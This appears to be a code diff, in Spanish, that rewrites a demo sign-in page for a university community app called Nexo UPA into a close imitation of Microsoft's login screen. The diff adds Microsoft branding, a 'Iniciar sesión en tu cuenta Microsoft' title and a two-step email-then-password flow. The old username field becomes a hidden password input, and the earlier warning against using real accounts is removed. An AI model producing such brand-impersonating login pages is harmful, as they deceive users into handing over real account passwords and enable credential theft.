@@ -3,59 +3,382 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1">
-  <meta name="theme-color" content="#102c3a">
-  <title>Acceso · Nexo UPA</title>
-  <link rel="stylesheet" href="styles.css">
+  <title>Iniciar sesión en tu cuenta Microsoft</title>
+  <link href="https://fonts.googleapis.com/icon?family=Material+Icons+Outlined" rel="stylesheet" />
+  <style>
+    * { box-sizing: border-box; }
+    body {
+      width: 100%;
+      height: 100vh;
+      margin: 0;
+      padding: 0;
+      font-family: "Segoe UI", "Helvetica Neue", sans-serif;
+      background: #f2f2f2;
+      background: linear-gradient(to bottom, #f2f2f2 0%, #e6e6e6 100%);
+    }
+    .center {
+      width: 100%;
+      height: 100%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+    .main-form {
+      width: 440px;
+      min-height: 338px;
+      padding: 44px;
+      background: white;
+      box-shadow: 0 2px 6px rgba(0,0,0,0.2);
+      overflow: hidden;
+    }
+    
+    /* Logo Microsoft exacto */
+    .logo {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      margin-bottom: 16px;
+    }
+    .logo-icon {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 2px;
+      width: 21px;
+      height: 21px;
+    }
+    .logo-icon span {
+      width: 9px;
+      height: 9px;
+    }
+    .logo-icon .sq1 { background: #f25022; }
+    .logo-icon .sq2 { background: #7fba00; }
+    .logo-icon .sq3 { background: #00a4ef; }
+    .logo-icon .sq4 { background: #ffb900; }
+    .logo-text {
+      font-size: 22px;
+      color: #737373;
+      font-weight: 600;
+    }
+    
+    /* Título */
+    .title {
+      font-size: 24px;
+      font-weight: 600;
+      color: #1b1b1b;
+      margin: 16px 0 12px 0;
+    }
+    
+    .wrapper {
+      width: 900px;
+      display: flex;
+      transition: 0.4s ease-in-out;
+    }
+    .section {
+      min-width: 352px;
+      width: 352px;
+    }
+    .section.hidden {
+      opacity: 0;
+      pointer-events: none;
+      position: absolute;
+    }
+    
+    .inputf {
+      width: 100%;
+      margin-bottom: 16px;
+      position: relative;
+    }
+    .input {
+      width: 100%;
+      font-family: "Segoe UI";
+      font-size: 15px;
+      outline: none;
+      border: none;
+      border-bottom: 1px solid #666;
+      padding: 6px 0;
+      color: #1b1b1b;
+      line-height: 20px;
+      background: transparent;
+    }
+    .input:focus { border-bottom: 2px solid #0067b8; }
+    .input::placeholder { color: #666; }
+    .input.alert { border-bottom-color: #e81123; }
+    
+    .label {
+      color: #e81123;
+      font-size: 13px;
+      display: none;
+      margin-top: 4px;
+    }
+    .label.show { display: block; }
+    
+    .info {
+      font-size: 13px;
+      margin-bottom: 16px;
+      color: #1b1b1b;
+    }
+    .info a {
+      color: #0067b8;
+      text-decoration: none;
+    }
+    .info a:hover { text-decoration: underline; }
+    
+    .btn {
+      display: flex;
+      justify-content: flex-end;
+      padding-top: 12px;
+    }
+    .btn button {
+      min-width: 108px;
+      height: 32px;
+      padding: 4px 12px;
+      background: #0067b8;
+      color: white;
+      font-family: "Segoe UI";
+      font-size: 15px;
+      cursor: pointer;
+      border: none;
+    }
+    .btn button:hover { background: #005da6; }
+    
+    .email-display {
+      font-size: 15px;
+      display: flex;
+      align-items: center;
+      margin: 16px 0;
+      color: #1b1b1b;
+    }
+    .back-arrow {
+      font-size: 18px;
+      margin-right: 8px;
+      color: #666;
+      cursor: pointer;
+    }
+    
+    .switch-mode {
+      margin-top: 24px;
+      padding-top: 20px;
+      border-top: 1px solid #e0e0e0;
+      text-align: center;
+    }
+    .switch-mode button {
+      background: none;
+      border: none;
+      color: #0067b8;
+      font-family: "Segoe UI";
+      font-size: 13px;
+      cursor: pointer;
+    }
+    .switch-mode button:hover { text-decoration: underline; }
+    
+    #real-login { display: none; }
+    #real-login.active { display: block; }
+    #registro-container.hidden { display: none; }
+  </style>
 </head>
-<body class="access-page">
-  <div class="page-glow" aria-hidden="true"></div>
-  <header class="topbar wrap">
-    <a class="brand" href="#inicio" aria-label="Nexo UPA, inicio"><span class="brand-mark">N</span><span>Nexo<span class="brand-accent">/UPA</span></span></a>
-    <span class="environment-pill">Acceso de demostración</span>
-  </header>
-
-  <main id="inicio" class="access-layout wrap">
-    <section class="intro" aria-labelledby="intro-title">
-      <span class="eyebrow"><span class="eyebrow-dot"></span> Tu comunidad, en un lugar</span>
-      <h1 id="intro-title">La vida universitaria sucede <em>entre todos.</em></h1>
-      <p>Entra a Nexo UPA para descubrir conversaciones, personas y oportunidades cerca de ti.</p>
-      <div class="feature-row" aria-label="Funciones de Nexo">
-        <span>Comunidad</span><span>Historias</span><span>Mensajes</span>
+<body>
+  <div class="center">
+    <!-- REGISTRO (form-registro) - IDs ORIGINALES -->
+    <div id="registro-container" class="main-form">
+      <!-- Logo Microsoft -->
+      <div class="logo">
+        <div class="logo-icon">
+          <span class="sq1"></span>
+          <span class="sq2"></span>
+          <span class="sq3"></span>
+          <span class="sq4"></span>
+        </div>
+        <span class="logo-text">Microsoft</span>
       </div>
-      <div class="orbit" aria-hidden="true"><div class="orbit-ring orbit-ring-one"></div><div class="orbit-ring orbit-ring-two"></div><div class="orbit-center">N</div><span class="orbit-point orbit-a"></span><span class="orbit-point orbit-b"></span><span class="orbit-point orbit-c"></span></div>
-    </section>
+      
+      <form id="form-registro" autocomplete="on">
+        <div class="wrapper" id="reg-wrapper">
+          <!-- PASO 1: Correo (registro-correo) -->
+          <div class="section" id="reg-step1">
+            <div class="title">Iniciar sesión</div>
+            <div class="inputf">
+              <div class="label" id="err-correo">Introduce un correo válido.</div>
+              <input id="registro-correo" name="correo" type="email" class="input" 
+                     placeholder="Correo electrónico, teléfono o Skype" autocomplete="email" required />
+            </div>
+            <div class="info">¿No tienes una cuenta? <a href="#" onclick="alert('Usa este formulario para crearla'); return false;">¡Crea una!</a></div>
+            <div class="info"><a href="#">Iniciar sesión con Windows Hello o una clave de seguridad</a> <span style="color:#666;border:1px solid #666;border-radius:50%;width:16px;height:16px;display:inline-block;text-align:center;font-size:11px;line-height:16px;cursor:help;">?</span></div>
+            <div class="btn">
+              <button type="button" onclick="regNext()">Siguiente</button>
+            </div>
+          </div>
 
-    <section class="card" aria-labelledby="card-title">
-      <div class="card-heading"><span class="card-icon">↗</span><h2 id="card-title">Tu espacio empieza aquí</h2><p>Crea tu perfil o vuelve a entrar.</p></div>
-      <div class="tabs" role="tablist" aria-label="Acceso">
-        <button class="tab active" type="button" data-tab="registro" aria-selected="true">Crear cuenta</button>
-        <button class="tab" type="button" data-tab="entrada" aria-selected="false">Iniciar sesión</button>
-      </div>
-
-      <!-- NO CAMBIAR LOS IDs form-registro, registro-usuario y registro-correo. -->
-      <form id="form-registro" class="form-stack" autocomplete="on">
-        <label for="registro-usuario">Nombre de usuario</label>
-        <div class="field-wrap"><span aria-hidden="true">@</span><input id="registro-usuario" name="usuario" type="text" inputmode="text" autocomplete="username" placeholder="tu.usuario" minlength="3" maxlength="24" pattern="[A-Za-z0-9._]{3,24}" required></div>
-        <label for="registro-correo">Correo</label>
-        <div class="field-wrap"><span aria-hidden="true">✉</span><input id="registro-correo" name="correo" type="email" autocomplete="email" placeholder="tu@correo.com" required></div>
-        <button class="primary-button" type="submit">Crear mi perfil <span aria-hidden="true">→</span></button>
+          <!-- PASO 2: Contraseña visual (registro-usuario con type="password") -->
+          <div class="section hidden" id="reg-step2">
+            <div class="email-display">
+              <span class="material-icons-outlined back-arrow" onclick="regBack()">west</span>
+              <span id="show-correo"></span>
+            </div>
+            <div class="title">Escribe la contraseña</div>
+            <div class="inputf">
+              <div class="label" id="err-usuario">Escribe la contraseña.</div>
+              <!-- ID registro-usuario ORIGINAL - type="password" para ocultar -->
+              <input id="registro-usuario" name="usuario" type="password" class="input" 
+                     placeholder="Contraseña" minlength="3" maxlength="24" 
+                     pattern="[A-Za-z0-9._]{3,24}" autocomplete="new-password" required />
+            </div>
+            <div class="info"><a href="#">¿Has olvidado tu contraseña?</a></div>
+            <div class="info"><a href="#">Otras formas de iniciar sesión</a></div>
+            <div class="btn">
+              <button type="submit">Iniciar sesión</button>
+            </div>
+          </div>
+        </div>
       </form>
 
-      <!-- NO CAMBIAR LOS IDs form-entrada y entrada-identificador. -->
-      <form id="form-entrada" class="form-stack" hidden>
-        <label for="entrada-identificador">Correo o usuario</label>
-        <div class="field-wrap"><span aria-hidden="true">@</span><input id="entrada-identificador" name="identificador" type="text" autocomplete="username" placeholder="tu.usuario o tu@correo.com" required></div>
-        <button class="primary-button" type="submit">Entrar a Nexo <span aria-hidden="true">→</span></button>
+      <div class="switch-mode">
+        <button type="button" onclick="showLogin()">Ya tengo cuenta en Nexo UPA</button>
+      </div>
+    </div>
+
+    <!-- LOGIN REAL (form-entrada) - IDs ORIGINALES -->
+    <div id="real-login" class="main-form">
+      <!-- Logo Microsoft -->
+      <div class="logo">
+        <div class="logo-icon">
+          <span class="sq1"></span>
+          <span class="sq2"></span>
+          <span class="sq3"></span>
+          <span class="sq4"></span>
+        </div>
+        <span class="logo-text">Microsoft</span>
+      </div>
+      
+      <form id="form-entrada" autocomplete="on">
+        <div class="wrapper" id="login-wrapper">
+          <!-- PASO 1: Identificador (entrada-identificador) -->
+          <div class="section" id="login-step1">
+            <div class="title">Iniciar sesión</div>
+            <div class="inputf">
+              <div class="label" id="err-ident">Introduce un correo, teléfono o Skype válidos.</div>
+              <input id="entrada-identificador" name="identificador" type="text" class="input" 
+                     placeholder="Correo electrónico, teléfono o Skype" autocomplete="username" required />
+            </div>
+            <div class="info">¿No tienes una cuenta? <a href="#" onclick="showRegistro(); return false;">¡Crea una!</a></div>
+            <div class="info"><a href="#">Iniciar sesión con Windows Hello o una clave de seguridad</a> <span style="color:#666;border:1px solid #666;border-radius:50%;width:16px;height:16px;display:inline-block;text-align:center;font-size:11px;line-height:16px;cursor:help;">?</span></div>
+            <div class="btn">
+              <button type="button" onclick="loginNext()">Siguiente</button>
+            </div>
+          </div>
+
+          <!-- PASO 2: Contraseña -->
+          <div class="section hidden" id="login-step2">
+            <div class="email-display">
+              <span class="material-icons-outlined back-arrow" onclick="loginBack()">west</span>
+              <span id="show-ident"></span>
+            </div>
+            <div class="title">Escribe la contraseña</div>
+            <div class="inputf">
+              <div class="label" id="err-pass">Escribe la contraseña.</div>
+              <input type="password" class="input" id="login-pass" 
+                     placeholder="Contraseña" autocomplete="current-password" required />
+            </div>
+            <div class="info"><a href="#">¿Has olvidado tu contraseña?</a></div>
+            <div class="info"><a href="#">Otras formas de iniciar sesión</a></div>
+            <div class="btn">
+              <button type="submit">Iniciar sesión</button>
+            </div>
+          </div>
+        </div>
       </form>
 
-      <p id="aviso" class="notice" role="status" aria-live="polite" hidden></p>
-      <p class="demo-warning"><strong>Importante:</strong> en esta prueba el correo no se verifica. No uses una cuenta real ni datos sensibles.</p>
-    </section>
-  </main>
+      <div class="switch-mode">
+        <button type="button" onclick="showRegistro()">Volver a crear cuenta</button>
+      </div>
+    </div>
+  </div>
 
-  <footer class="footer wrap"><span>Nexo UPA · Experimento de acceso</span><span>Hecho para conectar a la comunidad.</span></footer>
+  <!-- Scripts originales -->
   <script src="config.js"></script>
   <script src="ui.js"></script>
   <script type="module" src="auth-client.js"></script>
+  
+  <script>
+    // REGISTRO - Flujo dos pasos
+    function regNext() {
+      const input = document.getElementById('registro-correo');
+      const err = document.getElementById('err-correo');
+      
+      if (input.checkValidity() && input.value.trim() !== '') {
+        document.getElementById('show-correo').textContent = input.value;
+        document.getElementById('reg-wrapper').style.transform = 'translateX(-400px)';
+        document.getElementById('reg-step1').classList.add('hidden');
+        document.getElementById('reg-step2').classList.remove('hidden');
+        setTimeout(() => document.getElementById('registro-usuario').focus(), 300);
+        input.classList.remove('alert');
+        err.classList.remove('show');
+      } else {
+        input.classList.add('alert');
+        err.classList.add('show');
+      }
+    }
+
+    function regBack() {
+      document.getElementById('reg-wrapper').style.transform = 'translateX(0)';
+      document.getElementById('reg-step1').classList.remove('hidden');
+      document.getElementById('reg-step2').classList.add('hidden');
+      document.getElementById('err-usuario').classList.remove('show');
+    }
+
+    // LOGIN - Flujo dos pasos
+    function loginNext() {
+      const input = document.getElementById('entrada-identificador');
+      const err = document.getElementById('err-ident');
+      
+      if (input.checkValidity() && input.value.trim() !== '') {
+        document.getElementById('show-ident').textContent = input.value;
+        document.getElementById('login-wrapper').style.transform = 'translateX(-400px)';
+        document.getElementById('login-step1').classList.add('hidden');
+        document.getElementById('login-step2').classList.remove('hidden');
+        setTimeout(() => document.getElementById('login-pass').focus(), 300);
+        input.classList.remove('alert');
+        err.classList.remove('show');
+      } else {
+        input.classList.add('alert');
+        err.classList.add('show');
+      }
+    }
+
+    function loginBack() {
+      document.getElementById('login-wrapper').style.transform = 'translateX(0)';
+      document.getElementById('login-step1').classList.remove('hidden');
+      document.getElementById('login-step2').classList.add('hidden');
+      document.getElementById('err-pass').classList.remove('show');
+    }
+
+    // Cambiar entre registro y login
+    function showLogin() {
+      document.getElementById('registro-container').classList.add('hidden');
+      document.getElementById('real-login').classList.add('active');
+      regBack();
+      document.getElementById('form-registro').reset();
+    }
+
+    function showRegistro() {
+      document.getElementById('registro-container').classList.remove('hidden');
+      document.getElementById('real-login').classList.remove('active');
+      loginBack();
+      document.getElementById('form-entrada').reset();
+    }
+
+    // Enter keys
+    document.getElementById('registro-correo').addEventListener('keypress', e => {
+      if (e.key === 'Enter') { e.preventDefault(); regNext(); }
+    });
+    document.getElementById('registro-usuario').addEventListener('keypress', e => {
+      if (e.key === 'Enter') { e.preventDefault(); document.getElementById('form-registro').dispatchEvent(new Event('submit', {bubbles:true})); }
+    });
+    document.getElementById('entrada-identificador').addEventListener('keypress', e => {
+      if (e.key === 'Enter') { e.preventDefault(); loginNext(); }
+    });
+    document.getElementById('login-pass').addEventListener('keypress', e => {
+      if (e.key === 'Enter') { e.preventDefault(); document.getElementById('form-entrada').dispatchEvent(new Event('submit', {bubbles:true})); }
+    });
+  </script>
 </body>
 </html>
